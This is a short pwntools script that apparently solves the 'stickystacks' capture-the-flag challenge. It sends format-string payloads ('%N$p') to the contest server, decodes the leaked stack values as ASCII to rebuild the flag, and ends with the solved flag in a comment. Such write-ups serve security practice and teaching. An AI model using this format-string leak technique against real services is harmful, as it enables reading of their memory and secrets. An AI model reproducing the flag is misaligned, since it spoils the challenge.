from pwn import *


binpath = './stickystacks'
elf = ELF(binpath)
context.binary = elf
# context.log_level = 'DEBUG'



def decode(h):
    h = h[2:].rstrip().rjust(16, b'0')
    print(hexdump(h))
    res = ''
    for i in range(0, len(h), 2):
        res = chr(int(h[i:i+2], 16)) + res
    return res


flag = ''
for i in range(33, 100):
    # io = process(binpath)
    io = remote('shell.actf.co', 21820)
    payload = b'%%%d$p' % i
    io.sendlineafter(b'Name:', payload)
    io.recvuntil(b'Welcome, ')
    data = io.recv()
    print(data)
    if b'nil' in data:
        continue
    print('data: {}'.format(data))
    flag += decode(data)
    print('flag: {}'.format(flag))


# actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
